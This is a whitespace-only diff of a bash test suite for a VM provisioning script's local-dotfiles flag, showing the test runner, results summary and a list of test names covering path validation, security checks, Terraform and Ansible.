-	output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
-	local exit_code=$?
-	set -e
+    # In TEST_MODE, VM is never created, so VM_CREATED should remain false
+    set +e
+    output=$("$SCRIPT_DIR/../provision-vm.sh" test-vm --test-dotfiles "$TEST_DOTFILES_DIR" 2>&1)
+    local exit_code=$?
+    set -e
 
-	# Verify behavior: TEST_MODE exits before VM creation (no cleanup needed)
-	if [ $exit_code -eq 0 ] && echo "$output" | grep -q "DRY RUN"; then
-		result="pass"
-	fi
+    # Verify behavior: TEST_MODE exits before VM creation (no cleanup needed)
+    if [ $exit_code -eq 0 ] && echo "$output" | grep -q "DRY RUN"; then
+        result="pass"
+    fi
 
-	unset TEST_MODE
-	teardown_test_env
-	test_result "SEC-007: Script tracks VM creation state" "pass" "$result"
+    unset TEST_MODE
+    teardown_test_env
+    test_result "SEC-007: Script tracks VM creation state" "pass" "$result"
 }
 
 ##############################################################################
@@ -1636,32 +1636,32 @@ test_sec_007_vm_created_tracking() {
 ##############################################################################
 
 print_summary() {
-	echo ""
-	echo "========================================"
-	echo "Test Results Summary"
-	echo "========================================"
-	echo "Total tests run: $TESTS_RUN"
-	echo -e "${GREEN}Passed: $TESTS_PASSED${NC}"
-	echo -e "${RED}Failed: $TESTS_FAILED${NC}"
-	echo ""
+    echo ""
+    echo "========================================"
+    echo "Test Results Summary"
+    echo "========================================"
+    echo "Total tests run: $TESTS_RUN"
+    echo -e "${GREEN}Passed: $TESTS_PASSED${NC}"
+    echo -e "${RED}Failed: $TESTS_FAILED${NC}"
+    echo ""
 
-	if [ "$TESTS_FAILED" -gt 0 ]; then
-		echo -e "${RED}TESTS FAILED - Implementation needed${NC}"
-		echo "This is expected for TDD (Red-Green-Refactor)"
-		echo ""
-		echo "Next steps:"
-		echo "  1. Implement flag parsing in provision-vm.sh"
-		echo "  2. Add Terraform variable"
-		echo "  3. Update inventory template"
-		echo "  4. Update Ansible playbook"
-		echo "  5. Apply security mitigations"
-		echo "  6. Fix all bugs"
-		echo "  7. Re-run tests until all pass"
-		exit 1
-	else
-		echo -e "${GREEN}ALL TESTS PASSED!${NC}"
-		exit 0
-	fi
+    if [ "$TESTS_FAILED" -gt 0 ]; then
+        echo -e "${RED}TESTS FAILED - Implementation needed${NC}"
+        echo "This is expected for TDD (Red-Green-Refactor)"
+        echo ""
+        echo "Next steps:"
+        echo "  1. Implement flag parsing in provision-vm.sh"
+        echo "  2. Add Terraform variable"
+        echo "  3. Update inventory template"
+        echo "  4. Update Ansible playbook"
+        echo "  5. Apply security mitigations"
+        echo "  6. Fix all bugs"
+        echo "  7. Re-run tests until all pass"
+        exit 1
+    else
+        echo -e "${GREEN}ALL TESTS PASSED!${NC}"
+        exit 0
+    fi
 }
 
 ##############################################################################
@@ -1669,109 +1669,109 @@ print_summary() {
 ##############################################################################
 
 main() {
-	echo "========================================"
-	echo "Local Dotfiles Testing - TDD Test Suite"
-	echo "========================================"
-	echo "Testing Issue #19: --test-dotfiles flag"
-	echo ""
-	echo "This test suite follows TDD methodology:"
-	echo "  RED: Write failing tests first ✓"
-	echo "  GREEN: Implement minimal code to pass"
-	echo "  REFACTOR: Improve with security fixes"
-	echo ""
+    echo "========================================"
+    echo "Local Dotfiles Testing - TDD Test Suite"
+    echo "========================================"
+    echo "Testing Issue #19: --test-dotfiles flag"
+    echo ""
+    echo "This test suite follows TDD methodology:"
+    echo "  RED: Write failing tests first ✓"
+    echo "  GREEN: Implement minimal code to pass"
+    echo "  REFACTOR: Improve with security fixes"
+    echo ""
 
-	# Unit Tests - Flag Parsing
-	test_flag_parsing_no_flag
-	test_flag_parsing_with_path
-	test_flag_parsing_missing_argument
-	test_flag_parsing_multiple_flags
+    # Unit Tests - Flag Parsing
+    test_flag_parsing_no_flag
+    test_flag_parsing_with_path
+    test_flag_parsing_missing_argument
+    test_flag_parsing_multiple_flags
 
-	# Unit Tests - Path Validation
-	test_path_validation_nonexistent
-	test_path_validation_file_not_directory
-	test_path_validation_valid_directory
-	test_path_validation_relative_path
-	test_path_validation_with_spaces
-	test_path_validation_tilde_expansion
+    # Unit Tests - Path Validation
+    test_path_validation_nonexistent
+    test_path_validation_file_not_directory
+    test_path_validation_valid_directory
+    test_path_validation_relative_path
+    test_path_validation_with_spaces
+    test_path_validation_tilde_expansion
 
-	# Unit Tests - Security (CVE Mitigations)
-	test_security_symlink_detection
-	test_security_symlink_component_in_path
-	test_security_install_sh_dangerous_commands
-	test_security_install_sh_curl_pipe_bash
-	test_security_install_sh_safe_content
-	test_security_pattern_evasion_variable_expansion
-	test_security_pattern_evasion_base64
-	test_security_pattern_evasion_whitespace_ifs
-	test_security_pattern_evasion_eval
-	test_security_pattern_evasion_sudo
-	test_security_shell_injection_semicolon
-	test_security_shell_injection_pipe
-	test_security_shell_injection_backtick
-	test_security_shell_injection_dollar_paren
-	test_security_shell_injection_newline
-	test_security_shell_injection_tab
-	test_security_shell_injection_glob_asterisk
-	test_security_shell_injection_glob_question
-	test_security_shell_injection_glob_bracket
-	test_security_shell_injection_angle_brackets
-	test_security_shell_injection_braces
-	test_security_shell_injection_hash
-	test_security_shell_injection_quotes
-	test_security_shell_injection_backslash
-	test_security_shell_injection_printable_check
-	test_security_toctou_canonical_path_validation
-	test_security_toctou_symlink_replacement_prevention
-	test_security_git_shallow_clone_playbook
-	test_security_git_shallow_clone_both_sources
-	test_security_recursive_symlink_detection
-	test_security_nested_symlink_in_dotfiles
-	test_security_whitelist_safe_commands
-	test_security_whitelist_detects_python
-	test_security_whitelist_interactive_prompt
+    # Unit Tests - Security (CVE Mitigations)
+    test_security_symlink_detection
+    test_security_symlink_component_in_path
+    test_security_install_sh_dangerous_commands
+    test_security_install_sh_curl_pipe_bash
+    test_security_install_sh_safe_content
+    test_security_pattern_evasion_variable_expansion
+    test_security_pattern_evasion_base64
+    test_security_pattern_evasion_whitespace_ifs
+    test_security_pattern_evasion_eval
+    test_security_pattern_evasion_sudo
+    test_security_shell_injection_semicolon
+    test_security_shell_injection_pipe
+    test_security_shell_injection_backtick
+    test_security_shell_injection_dollar_paren
+    test_security_shell_injection_newline
+    test_security_shell_injection_tab
+    test_security_shell_injection_glob_asterisk
+    test_security_shell_injection_glob_question
+    test_security_shell_injection_glob_bracket
+    test_security_shell_injection_angle_brackets
+    test_security_shell_injection_braces
+    test_security_shell_injection_hash
+    test_security_shell_injection_quotes
+    test_security_shell_injection_backslash
+    test_security_shell_injection_printable_check
+    test_security_toctou_canonical_path_validation
+    test_security_toctou_symlink_replacement_prevention
+    test_security_git_shallow_clone_playbook
+    test_security_git_shallow_clone_both_sources
+    test_security_recursive_symlink_detection
+    test_security_nested_symlink_in_dotfiles
+    test_security_whitelist_safe_commands
+    test_security_whitelist_detects_python
+    test_security_whitelist_interactive_prompt
 
-	# Unit Tests - Git Repository Validation
-	test_git_repo_validation_valid
-	test_git_repo_validation_invalid
-	test_git_repo_validation_not_a_repo
+    # Unit Tests - Git Repository Validation
+    test_git_repo_validation_valid
+    test_git_repo_validation_invalid
+    test_git_repo_validation_not_a_repo
 
-	# Unit Tests - install.sh Validation
-	test_install_sh_missing_warning
-	test_install_sh_present
-	test_install_sh_not_executable
-	test_install_sh_world_writable
-	test_install_sh_group_writable
+    # Unit Tests - install.sh Validation
+    test_install_sh_missing_warning
+    test_install_sh_present
+    test_install_sh_not_executable
+    test_install_sh_world_writable
+    test_install_sh_group_writable
 
-	# Integration Tests - Terraform
-	test_terraform_variable_passing
-	test_terraform_variable_empty_default
-	test_terraform_validation_rejects_relative_paths
-	test_terraform_validation_accepts_absolute_paths
-	test_terraform_validation_accepts_empty_path
+    # Integration Tests - Terraform
+    test_terraform_variable_passing
+    test_terraform_variable_empty_default
+    test_terraform_validation_rejects_relative_paths
+    test_terraform_validation_accepts_absolute_paths
+    test_terraform_validation_accepts_empty_path
 
-	# Integration Tests - Ansible Inventory
-	test_ansible_inventory_with_local_path
-	test_ansible_inventory_without_local_path
+    # Integration Tests - Ansible Inventory
+    test_ansible_inventory_with_local_path
+    test_ansible_inventory_without_local_path
 
-	# Integration Tests - Ansible Playbook
-	test_ansible_playbook_uses_local_repo
-	test_ansible_playbook_uses_github_default
-	test_ansible_whitespace_handling
+    # Integration Tests - Ansible Playbook
+    test_ansible_playbook_uses_local_repo
+    test_ansible_playbook_uses_github_default
+    test_ansible_whitespace_handling
 
-	# E2E Tests
-	test_e2e_full_pipeline
-	test_e2e_dry_run_with_default_dotfiles
+    # E2E Tests
+    test_e2e_full_pipeline
+    test_e2e_dry_run_with_default_dotfiles
 
-	# Bug Tests
-	test_bug_008_rollback_mechanism
-	test_sec_007_cleanup_trap_exists
-	test_sec_007_vm_created_tracking
+    # Bug Tests
+    test_bug_008_rollback_mechanism
+    test_sec_007_cleanup_trap_exists
+    test_sec_007_vm_created_tracking
 
-	# Print summary
-	print_summary
+    # Print summary
+    print_summary
 }
 
 # Run tests if executed directly
 if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
-	main "$@"
+    main "$@"
 fi
